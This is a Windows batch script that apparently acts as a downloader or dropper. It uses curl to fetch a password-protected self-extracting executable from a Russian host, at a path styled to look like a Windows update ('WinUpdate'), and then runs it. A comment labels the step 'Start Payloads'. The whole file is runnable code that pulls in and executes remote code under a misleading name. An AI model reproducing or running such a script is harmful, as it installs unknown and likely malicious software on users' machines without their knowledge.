@echo off
set anURL=http://file.netip4.ru/WinUpdate/InitialCommon/
set SFXARCH=szbek.exe
set PASS=szbeck
set FOLDER=C:\UTIL
rem Start Payloads
c:\Util\curl.exe -o "%FOLDER%\%SFXARCH%" %anURL%%SFXARCH%
if not exist "%FOLDER%\%SFXARCH%" goto Error
echo Unpack %SFXARCH% ...
"%FOLDER%\%SFXARCH%" -p%PASS%
goto Finish
:Error
echo "File %FOLDER%\%SFXARCH% not found" && exit /b 1
rem pause
:Finish
exit /b 0